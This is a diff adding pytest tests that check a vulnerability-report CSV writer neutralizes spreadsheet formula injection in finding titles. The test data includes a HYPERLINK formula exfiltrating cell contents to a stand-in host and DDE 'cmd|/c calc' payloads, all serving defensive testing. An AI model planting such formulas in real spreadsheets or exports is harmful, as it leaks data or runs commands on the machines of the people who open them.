@@ -163,6 +163,53 @@ def test_write_vulnerabilities_creates_markdown_csv_and_json(tmp_path: Path) -> 
     assert csv_rows[0]["severity"] == "CRITICAL"
 
 
+@pytest.mark.parametrize(
+    "payload",
+    [
+        '=HYPERLINK("http://evil.example/leak?d="&A1,"View")',
+        "+cmd|'/c calc'!A1",
+        "@SUM(1+1)*cmd|'/c calc'!A1",
+        "-2+3+cmd|'/c calc'!A1",
+        "\t leading tab",
+        "\r leading carriage return",
+    ],
+)
+def test_write_vulnerabilities_csv_neutralizes_formula_injection(
+    tmp_path: Path,
+    payload: str,
+) -> None:
+    # Titles quote text from the scanned target, so a finding title can begin with
+    # a spreadsheet formula trigger. csv escapes CSV syntax but not formula
+    # triggers, so the cell has to be neutralized before it is written.
+    write_vulnerabilities(tmp_path, [_sample_report(title=payload)], set())
+
+    csv_rows = list(
+        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
+    )
+    title = csv_rows[0]["title"]
+    assert title.startswith("'")
+    assert not title.startswith(("=", "+", "-", "@", "\t", "\r"))
+
+
+def test_write_vulnerabilities_csv_preserves_payload_after_guard(tmp_path: Path) -> None:
+    payload = "=1+1"
+    write_vulnerabilities(tmp_path, [_sample_report(title=payload)], set())
+
+    csv_rows = list(
+        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
+    )
+    assert csv_rows[0]["title"] == "'=1+1"  # guard prefix only, payload intact
+
+
+def test_write_vulnerabilities_csv_leaves_benign_titles_unchanged(tmp_path: Path) -> None:
+    write_vulnerabilities(tmp_path, [_sample_report(title="SQL Injection in /login")], set())
+
+    csv_rows = list(
+        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
+    )
+    assert csv_rows[0]["title"] == "SQL Injection in /login"
+
+
 def test_write_vulnerabilities_skips_already_saved_ids(tmp_path: Path) -> None:
     reports = [_sample_report(id="vuln-0001")]
     saved: set[str] = {"vuln-0001"}
